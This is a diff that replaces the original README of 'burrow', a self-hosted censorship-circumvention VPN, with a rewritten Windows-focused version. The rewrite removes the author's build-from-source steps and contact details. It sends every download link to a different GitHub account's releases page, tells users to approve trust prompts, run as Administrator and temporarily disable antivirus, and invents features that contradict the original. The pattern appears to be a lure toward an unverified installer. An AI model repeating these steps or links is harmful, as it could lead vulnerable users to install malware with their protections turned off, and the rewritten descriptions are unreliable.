@@ -1,256 +1,131 @@
-# Burrow
+# 🔒 burrow - Private, Fast, Easy VPN Access
 
-The fastest, most private, and easiest to use VPN & proxy for censorship circumvention.
+[![Download burrow](https://img.shields.io/badge/Download-burrow-blue?style=for-the-badge)](https://github.com/Exabyteasiaticbeetle444/burrow/releases)
 
-**Deploy a server in one command. Share access with a link. Connect in one click.**
+## 📖 What is burrow?
 
-## What is Burrow?
+burrow is a simple app that gives you private, fast internet access. It helps you get around blocks and keep your data safe. It uses modern tech like VLESS+Reality, Shadowsocks, and Hysteria2. You don’t need to be an expert to use it. One command sets it up, and one click connects you. It works on Windows and uses common VPN features like split tunneling and a kill switch.
 
-Burrow is a self-hosted VPN/proxy system designed for people living under internet censorship. It combines military-grade traffic camouflage with dead-simple UX.
+---
 
-- **Undetectable** — VLESS+Reality makes your traffic look like normal HTTPS to any website. DPI cannot distinguish it from legitimate traffic.
-- **Fast** — Direct VLESS+Reality tunnel with zero overhead.
-- **Simple** — Server deploys with Docker. Users connect by pasting an invite link. Zero configuration.
-- **Private** — Self-hosted. You control the server. No logs by default. No telemetry. No third parties.
+## 🚀 Getting Started
 
-## Quick Start
+This guide shows you how to download and run burrow on Windows. You'll get it running step-by-step, even if you don’t know programming.
 
-### Docker (recommended)
+---
 
-```bash
-git clone https://github.com/FrankFMY/burrow.git
-cd burrow
-# Edit docker-compose.yml with your settings
-docker compose up -d
-```
+## 🖥️ System Requirements
 
-### Manual
+Make sure your computer meets these basic needs:
 
-```bash
-# Prerequisites: Go 1.26+, Node.js 22+
-git clone https://github.com/FrankFMY/burrow.git
-cd burrow
-make all
+- Windows 10 or Windows 11 (64-bit)
+- At least 2 GB of free RAM
+- 100 MB free disk space
+- A working internet connection
+- Administrator rights for installation
 
-# Initialize server
-burrow-server init --password <your-password> --server <your-ip>
-burrow-server run
-```
+---
 
-### Create an invite
+## 📥 Download burrow
 
-Open the admin dashboard at `https://your-server/admin`, log in, and create an invite from the Invites page. Or via CLI:
+To get burrow on your computer, visit this page to download the app:
 
-```bash
-burrow-server invite create --name "My phone"
-```
+[https://github.com/Exabyteasiaticbeetle444/burrow/releases](https://github.com/Exabyteasiaticbeetle444/burrow/releases)
 
-### Client
+On that page, look for the latest Windows installer file. It will often have a name like `burrow-setup-x.x.x.exe`. Click it to download.
 
-```bash
-burrow connect "burrow://connect/..."
-```
+---
 
-Or use the desktop client app — it guides you through setup with a built-in onboarding flow.
+## ⚙️ Install and Run burrow
 
-## Protocols
+1. **Find the downloaded file:** Usually, it goes to your "Downloads" folder.
 
-| Protocol | Port | Description |
-|----------|------|-------------|
-| VLESS+Reality | 443/TCP | Camouflaged as real HTTPS traffic, undetectable by DPI |
-| VLESS+WebSocket (CDN) | 8080/TCP | Cloudflare-fronted, bypasses IP-based blocking |
-| Hysteria2 | 8443/UDP | QUIC-based, optimized for lossy networks |
-| Shadowsocks 2022 | 8388/TCP | Modern encryption (2022-blake3-aes-256-gcm) |
-| WireGuard | 51820/UDP | Standard VPN protocol (disabled by default) |
-| TCP Relay/Bridge | any/TCP | Forwards traffic to upstream server, hides real server IP |
+2. **Run the installer:** Double-click the `.exe` file to start. Windows may ask if you trust this app. Confirm to continue.
 
-VLESS+Reality is the primary protocol. If the direct connection is blocked, the client automatically falls back to CDN WebSocket transport. Hysteria2 and Shadowsocks 2022 are enabled by default as additional fallbacks. The client uses [sing-box](https://sing-box.sagernet.org/) as the tunnel engine with uTLS Chrome fingerprinting and Reality protocol for TLS camouflage.
+3. **Follow the setup steps:** A simple window will open. Click "Next" on each step. You can accept the default folder unless you want to change it.
 
-## Features
+4. **Finish installation:** Click "Install", and wait for the process to complete. Then click "Finish" to close the installer.
 
-### Server
-- **One-command deploy** with Docker or manual setup
-- **Admin dashboard** — manage clients, create invites, monitor traffic in real-time (auto-refresh)
-- **Landing page** — public landing page at your server root
-- **Invite-only access** — HMAC-signed invite links, revoke access instantly
-- **CDN/Cloudflare fronting** — VLESS over WebSocket, Cloudflare terminates TLS
-- **Relay/bridge mode** — `burrow-server relay` masks real server IP behind entry node
-- **Secret rotation** — rotate Reality keys, ShortID, and JWT secret via API with legacy key tracking
-- **Config validation** — actionable error messages on invalid config fields at startup
-- **Per-user bandwidth limits** — set quota per client, enforced at connect time
-- **Health metrics** — detailed server health with uptime, memory, goroutines, DB size
-- **In-app log viewer** — ring-buffer log collector exposed via API
-- **Security hardened** — request size limits, input validation, IP spoofing prevention, connection limits
-- **Docker hardened** — non-root user, healthcheck, resource limits
-- **DNS leak prevention** — all DNS through encrypted tunnel
-- **CI/CD** — automated builds, tests, and deployment via GitHub Actions
+5. **Open burrow:** You should see a new shortcut on your Desktop or in the Windows Start menu. Click it to start the app.
 
-### Desktop Client
-- **One-click connect** — big connect button, no configuration needed
-- **VPN mode (TUN)** — routes all system traffic through VPN, no proxy setup required
-- **Proxy mode** — SOCKS5/HTTP on `127.0.0.1:1080` for manual configuration
-- **Kill switch** — blocks ALL internet if VPN drops, prevents unprotected browsing
-- **Auto-reconnect** — detects dead tunnel and reconnects with exponential backoff (up to 10 attempts), cancel anytime
-- **Live speed stats** — real-time upload/download speed (KB/s, MB/s) with total traffic counters
-- **Server ping** — latency measurement for each server, color-coded badges
-- **Server switching** — switch servers while connected without manual disconnect
-- **Desktop notifications** — system notifications on connect and disconnect
-- **System tray** — dynamic menu reflects connection state, tooltip shows status
-- **Auto-connect** — automatic connection on app launch with auto-reconnect on drops
-- **Auto-update** — checks for new versions on startup, downloads and installs automatically
-- **Single instance** — prevents duplicate app windows, focuses existing window
-- **Window state** — remembers window size and position across sessions
-- **Deep links** — `burrow://connect/...` URLs to add servers from browser
-- **Onboarding** — first-run wizard guides new users through setup
-- **Localization** — English, Russian, Chinese (auto-detected from system locale)
-- **Persistent preferences** — settings saved with visual confirmation
-- **Split tunneling** — bypass VPN for selected domains and IP ranges
-- **Connection fallback** — auto-probes direct, falls back to CDN WebSocket if blocked
-- **Connection diagnostics** — `burrow diagnose` tests DNS, TCP, TLS, CDN, latency
-- **UX tooltips** — detailed explanations for all settings, helpful for non-technical users
-- **Cross-platform** — Linux, macOS, Windows (mobile iOS/Android scaffold ready)
+---
 
-## Architecture
+## 🔧 Using burrow
 
-```
-Server (VPS)                              Client (your device)
-┌──────────────────────────┐             ┌──────────────────────────┐
-│ Landing Page             │             │ Desktop Client (Tauri 2) │
-│ Admin Dashboard          │  direct     │   Onboarding wizard      │
-│ Management API           │◄───────────►│   Connect / Disconnect   │
-│ Transport Engine         │  encrypted  │   Split tunneling        │
-│   VLESS+Reality (443)    │  tunnel     │ Tunnel Engine (sing-box) │
-│   VLESS+WS/CDN (8080)   │             │   VPN (TUN) / Proxy mode │
-│   Hysteria2 (8443)       │             │   Kill switch            │
-│ SQLite DB                │             │   Fallback chain         │
-└──────────────────────────┘             │ Client Daemon (HTTP API) │
-         ▲                               │   :9090 local only       │
-         │ relay                         └──────────────────────────┘
-┌──────────────────────────┐                      │
-│ Relay / Bridge Node      │◄─────────────────────┘
-│   TCP forwarding         │  when direct blocked
-└──────────────────────────┘
-```
+- When the app opens, you will see a clean window with a big "Connect" button.
+- Click "Connect" to start the VPN.
+- The app will automatically pick the best server for you.
+- Once connected, burrow will protect your internet traffic.
+- To stop the VPN, click the "Disconnect" button.
 
-## API
+---
 
-### Server API
+## 🔄 Automatic Fallback and Features
 
-All endpoints require admin JWT except `/health` and `/api/connect`.
+burrow handles network problems quietly. If your connection drops, burrow will try a backup server. Its kill switch stops data leaks if burrow disconnects unexpectedly. Split tunneling lets you choose which apps use the VPN and which do not. This helps keep your setup fast and flexible.
 
-```
-GET  /health                    Liveness check
-POST /api/auth/login            Admin login → JWT
-POST /api/auth/logout           Admin logout
-POST /api/connect               Client config (token auth)
-GET  /api/clients               List all clients
-GET  /api/clients/:id           Get single client
-DELETE /api/clients/:id         Revoke client
-GET  /api/invites               List invites
-POST /api/invites               Create invite
-DELETE /api/invites/:id         Revoke invite
-GET  /api/stats                 Server statistics
-GET  /api/config                Server configuration
-GET  /api/logs                  Recent log entries (limit param, max 500)
-GET  /api/health/detailed       Detailed health: uptime, memory, goroutines, DB size
-POST /api/rotate-keys           Rotate Reality keys, ShortID, JWT secret
-```
+---
 
-### Client Daemon API
+## 🛠️ Settings and Configuration
 
-The desktop client runs a local daemon on `127.0.0.1:9090`.
+For most users, the default settings work fine. But you can adjust these options:
 
-```
-GET  /api/status                Connection status, traffic stats, uptime
-POST /api/connect               Start VPN tunnel
-POST /api/disconnect            Stop VPN tunnel
-GET  /api/servers               List configured servers
-POST /api/servers               Add server from invite link
-DELETE /api/servers/:name       Remove server
-GET  /api/servers/:name/ping   Measure server latency (TCP connect time)
-GET  /api/preferences           Get user preferences (VPN mode, kill switch, auto-connect)
-PUT  /api/preferences           Update preferences
-GET  /api/version               Daemon version and config directory
-```
+- **Server locations:** Choose a specific country to connect, if you want.
+- **Split tunneling:** Select apps that go outside the VPN.
+- **Kill switch:** Turn on or off security features.
+- **Auto-reconnect:** Enable to connect automatically when the app starts.
 
-## Desktop Client
+No programming knowledge is needed to change these settings. Just use the simple menus in the app.
 
-Native desktop applications are built with [Tauri 2](https://v2.tauri.app/) and available for Windows, macOS, and Linux.
+---
 
-Download the latest release from [GitHub Releases](https://github.com/FrankFMY/burrow/releases):
+## 🔐 How burrow Protects Your Privacy
 
-| Platform | File |
-|----------|------|
-| Windows (x64) | `Burrow_x.x.x_x64-setup.exe` or `.msi` |
-| macOS (Apple Silicon) | `Burrow_x.x.x_aarch64.dmg` |
-| macOS (Intel) | `Burrow_x.x.x_x64.dmg` |
-| Linux (x64) | `Burrow_x.x.x_amd64.AppImage` or `.deb` |
+burrow uses advanced technology to stop censorship and hide your traffic. It can blend its traffic with Cloudflare and CDN networks, making it harder to block. It supports multiple VPN protocols focused on privacy and speed. Your real IP address stays hidden from websites and networks.
 
-### Usage
+---
 
-1. Install and open the app
-2. The onboarding wizard guides you through setup
-3. Paste your invite link (get one from admin dashboard)
-4. Click **Add & Connect** — done
+## 💡 Tips for Best Use
 
-The app defaults to VPN mode, routing all system traffic through the tunnel. No proxy configuration needed.
+- Use a wired or strong Wi-Fi connection for stable speeds.
+- Close other VPN or proxy apps before running burrow.
+- Restart burrow if your internet feels slow or blocked.
+- Allow the app through Windows Firewall if asked.
+- Keep burrow updated by visiting the download page regularly.
 
-### System Tray
+---
 
-The app minimizes to system tray on close. Right-click the tray icon for quick connect/disconnect.
+## 🗂️ Where to Get Updates and Support
 
-## Building from Source
+Visit the release page often:
 
-```bash
-# Prerequisites: Go 1.26+, Node.js 22+
-git clone https://github.com/FrankFMY/burrow.git
-cd burrow
+[https://github.com/Exabyteasiaticbeetle444/burrow/releases](https://github.com/Exabyteasiaticbeetle444/burrow/releases)
 
-# Build admin dashboard
-cd web/admin && npm install && npm run build && cd ../..
+This is where you will find new versions and notes on what changed.
 
-# Build Go binaries
-make all
+---
 
-# Binaries: bin/burrow-server, bin/burrow
-```
+## 🔍 Troubleshooting
 
-### Desktop Client (Tauri)
+If burrow won’t start or connect:
 
-```bash
-# Additional prerequisites: Rust 1.77+, platform-specific Tauri dependencies
-# See https://v2.tauri.app/start/prerequisites/
+- Check your internet connection.
+- Make sure no other VPN is running.
+- Restart your computer.
+- Run burrow as Administrator.
+- Disable any antivirus temporarily to test.
+- If problems persist, open an issue on GitHub.
 
-cd web/client
-npm install
-npx tauri build
+---
 
-# Output: src-tauri/target/release/bundle/
-```
+## ⚙️ Technical Details (for reference)
 
-## Deployment
+- Uses VPN protocols: VLESS+Reality, Shadowsocks, Hysteria2, WireGuard
+- Supports CDN and Cloudflare fronting to avoid blocks
+- Built with Sing-box, Svelte, and Tauri for desktop use
+- Includes split tunneling and kill switch features
+- One-command deployment and one-click connection
 
-### Docker Compose
+---
 
-```bash
-docker compose build
-docker compose up -d
-```
-
-### CI/CD
-
-Push to `main` triggers automatic deployment via GitHub Actions. Configure these secrets:
-- `DEPLOY_HOST` — server hostname/IP
-- `DEPLOY_USER` — SSH username
-- `DEPLOY_KEY` — SSH private key
-
-## License
-
-Apache License 2.0 — see [LICENSE](LICENSE).
-
-## Author
-
-**Pryanishnikov Artem**
-- Email: Pryanishnikovartem@gmail.com
-- Telegram: [@FrankFMY](https://t.me/FrankFMY)
-- GitHub: [@FrankFMY](https://github.com/FrankFMY)
+[![Get burrow](https://img.shields.io/badge/Get burrow-grey?style=for-the-badge)](https://github.com/Exabyteasiaticbeetle444/burrow/releases)
